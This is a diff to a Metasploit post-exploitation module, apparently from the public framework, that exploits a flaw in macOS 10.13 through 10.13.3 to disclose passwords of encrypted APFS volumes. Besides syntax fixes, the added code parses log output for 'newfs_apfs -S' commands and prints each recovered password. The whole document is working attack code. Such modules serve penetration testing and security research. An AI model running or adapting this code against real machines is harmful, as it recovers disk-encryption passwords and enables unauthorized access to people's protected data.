@@ -7,10 +7,10 @@ class MetasploitModule < Msf::Post
   def initialize(info={})
     super(update_info(info,
       'Name'          => 'Mac OS X APFS Encrypted Volume Password Disclosure',
-      'Description'   => %q{
+      'Description'   => %q(
         This module exploits a flaw in OSX 10.13 through 10.13.3
         that discloses the passwords of encrypted APFS volumes.
-      },
+      ),
       'License'       => MSF_LICENSE,
       'References'    =>
         [
@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Post
 
         ],
       'Platform'      => 'osx',
-      'Arch'          => ARCH_ALL
+      'Arch'          => ARCH_ALL,
       'Author'         => [
         'Sarah Edwards',  # earliest public discovery
         'cbrnrd'          # Metasploit module
@@ -56,7 +56,18 @@ class MetasploitModule < Msf::Post
     if results.empty?
       print_error 'Got no response from target. Stopping...'
     else
-      print_good results
+      successful_lines = 0
+      results.lines.each do |l|
+        s = l.split(' ')[11..-1].join # Just the command executed
+        next unless s =~ /newfs_apfs/ && s =~ /-S (.+)/
+        successful_lines += 1
+        ss = s.split(' ')
+        flagindex = ss.rindex('-S')
+        print_good "Password found: #{ss[flagindex + 1]}"
+      end
+
+      print_error "No password(s) found for any volumes. Exiting..." if successful_lines.zero?
+
     end
   end
 end
